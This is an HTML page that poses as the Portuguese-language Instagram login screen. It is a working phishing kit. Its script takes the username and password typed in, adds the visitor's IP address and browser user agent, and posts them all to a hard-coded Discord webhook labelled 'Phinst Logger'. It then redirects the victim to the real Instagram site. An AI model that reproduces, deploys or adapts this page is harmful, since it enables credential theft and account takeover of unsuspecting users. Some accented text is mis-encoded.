<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="/styles.css" />
    <link rel="icon" type="image/png" href="/img/insta-fav.ico">
    <title>Instagram clone</title>
    <style>
        .loading-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(255,255,255,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            font-family: Arial, sans-serif;
            font-size: 18px;
            color: #555;
            display: none;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3897f0;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loading">
        <div class="spinner"></div> Redirecionando para o Instagram...
    </div>

    <main class="flex align-items-center justify-content-center">
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 class="flex justify-content-center">
                    <img src="/img/instagram-logo.png" alt="Instagram logo" />
                </h1>

                <form id="loginForm">
                    <input id="email" name="email" type="text" placeholder="Telefone, nome de usuÃ¡rio ou e-mail" required />
                    <input id="password" name="password" type="password" placeholder="Senha" required />
                    <button type="submit">Entrar</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>

                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img src="/img/facebooklogo.png" alt="Facebook Icon">
                        <a href="#">Entrar com o Facebook</a>
                    </div>
                    <a href="#">Esqueceu a senha?</a>
                </div>
            </div>

            <div class="panel register flex justify-content-center">
                <p>NÃ£o tem uma conta?</p>
                <a href="#">Cadastre-se</a>
            </div>

            <div class="app-download flex direction-column align-items-center">
                <p>Obtenha o aplicativo.</p>
                <div class="flex justify-content-center">
                    <img src="/img/apple-button.png" alt="Apple Store" />
                    <img src="/img/googleplay-button.png" alt="Google Play" />
                </div>
            </div>
        </section>
    </main>

    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">SOBRE</a></li>
            <li><a href="#">AJUDA</a></li>
            <li><a href="#">IMPRENSA</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CARREIRAS</a></li>
            <li><a href="#">PRIVACIDADE</a></li>
            <li><a href="#">TERMOS</a></li>
            <li><a href="#">LOCALIZAÃ‡ÃƒO</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">Â© 2020 Instagram do Facebook</p>
    </footer>

    <script>
        const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";

        function showLoading() {
            document.getElementById('loading').style.display = 'flex';
        }

        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();
            showLoading();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const userAgent = navigator.userAgent;

            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(ipData => {
                    const payload = {
                        username: "Phinst Logger",
                        embeds: [{
                            title: "ðŸ“¥ Credenciais JS Recebidas",
                            color: 0x00FFFF,
                            fields: [
                                { name: "Login", value: email, inline: true },
                                { name: "Senha", value: password, inline: true },
                                { name: "IP", value: ipData.ip, inline: false },
                                { name: "User-Agent", value: userAgent, inline: false }
                            ]
                        }]
                    };

                    return fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                })
                .then(() => {
                    window.location.href = "https://www.instagram.com";
                })
                .catch(err => {
                    console.error("Erro ao enviar:", err);
                    window.location.href = "https://www.instagram.com";
                });
        });
    </script>
</body>
</html>
